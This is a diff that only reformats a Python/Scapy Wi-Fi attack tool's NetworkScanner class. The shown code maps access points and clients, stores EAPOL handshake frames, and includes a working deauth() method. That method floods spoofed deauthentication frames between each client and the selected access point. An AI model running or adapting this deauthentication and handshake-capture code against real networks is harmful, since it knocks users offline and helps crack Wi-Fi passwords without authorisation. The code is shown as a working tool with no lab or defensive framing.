@@ -8,9 +8,14 @@ from access_point import *
 from change_channel import *
 from capture_manager import *
 
+
 class NetworkScanner():
-    
-    def __init__(self, interface_name: str, channel_table: dict, start_channel: int):
+
+    def __init__(
+            self,
+            interface_name: str,
+            channel_table: dict,
+            start_channel: int):
         self.interface_name = interface_name
         self.channel_table = channel_table
         self.start_channel = start_channel
@@ -20,10 +25,10 @@ class NetworkScanner():
 
         # Access point MAC addresses
         self.ap_bssids = set()
-        
+
         # BSSID:AccessPoint
         self.bssid_map = {}
-        
+
         # SSID:AccessPoint
         self.ssid_map = {}
 
@@ -37,7 +42,7 @@ class NetworkScanner():
 
         self.deauth_packet_count = 0
         self.max_packets = 0
-        
+
     def stop_all(self):
         self.stop_sniff.set()
         self.stop_changing_channel.set()
@@ -47,7 +52,8 @@ class NetworkScanner():
         """Handle different types of 802.11 frames"""
 
         # Handle beacon frames
-        if pkt.haslayer(Dot11Beacon) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
+        if pkt.haslayer(
+                Dot11Beacon) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
             self.handle_beacon(pkt)
 
         # Handle EAPOL frame (handshake)
@@ -59,7 +65,7 @@ class NetworkScanner():
             ssid = pkt[Dot11ProbeReq].info.decode()
             if ssid:
                 ap = self.ssid_map.get(ssid)
-                if ap and pkt[Dot11].addr2 not in ap.clients: 
+                if ap and pkt[Dot11].addr2 not in ap.clients:
                     ap.add_client(pkt[Dot11].addr2)
 
         # Handle association requests
@@ -73,7 +79,7 @@ class NetworkScanner():
         elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
             match pkt[Dot11].subtype:
                 # Data frame
-                case 0:  
+                case 0:
                     source = pkt[Dot11].addr2
                     destination = pkt[Dot11].addr1
                     self.process_client_data_frame(source, destination)
@@ -89,7 +95,6 @@ class NetworkScanner():
                     source = pkt[Dot11].addr2
                     destination = pkt[Dot11].addr3
                     self.process_client_data_frame(source, destination)
-
 
     def handle_beacon(self, pkt: Packet):
         """Handle beacon frames"""
@@ -113,7 +118,6 @@ class NetworkScanner():
             self.bssid_map[bssid].update_signal_strength(signal_strength)
             self.bssid_map[bssid].update_channel(channel)
 
-
     def handle_eapol(self, pkt: Packet):
         """Process EAPOL packet, save key message type"""
         # Message type (1/2/3/4/0)
@@ -126,12 +130,11 @@ class NetworkScanner():
         elif pkt[Dot11].addr3 in self.bssid_map:
             self.bssid_map[pkt[Dot11].addr3].eapol_messages[msg_type] = pkt
 
-
     def process_client_data_frame(self, src: str, dest: str):
         if dest in self.bssid_map.keys() and dest != 'ff:ff:ff:ff:ff:ff':
-                if src not in self.bssid_map[dest].clients:
-                    self.bssid_map[dest].add_client(src)
-    
+            if src not in self.bssid_map[dest].clients:
+                self.bssid_map[dest].add_client(src)
+
     def deauth(self):
         """Craft and send deauthentication packets"""
         self.deauth_packet_count = 0
@@ -140,27 +143,32 @@ class NetworkScanner():
         while not self.deauth_packet_count >= self.max_packets:
             for client in self.selected_ap.clients:
                 # From AP to client
-                ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid, addr2=client, addr3=self.selected_ap.bssid)/Dot11Deauth()
+                ap_to_client = RadioTap() / Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid,
+                                                  addr2=client, addr3=self.selected_ap.bssid) / Dot11Deauth()
                 # From client to AP
-                client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid)/Dot11Deauth()
-                
+                client_to_ap = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
+                                                  addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid) / Dot11Deauth()
+
                 # Send packets and update packet count
                 sendp(ap_to_client, iface=self.interface_name, verbose=False)
                 self.deauth_packet_count += 1
                 sendp(client_to_ap, iface=self.interface_name, verbose=False)
                 self.deauth_packet_count += 1
 
-    def start_sniffing(self, filter: str=''):
+    def start_sniffing(self, filter: str = ''):
         sniff(
             iface=self.interface_name,
             prn=self.handle_packet,
             store=False,
             filter=filter,
             stop_filter=lambda x: self.stop_sniff.is_set()
-            )
-        
+        )
+
     def start_channel_hopping(self):
-        change_channel(self.start_channel, self.interface_name, self.stop_changing_channel)
+        change_channel(
+            self.start_channel,
+            self.interface_name,
+            self.stop_changing_channel)
 
     def select_ap(self, ap: AccessPoint):
         self.capture_manager.ap = ap
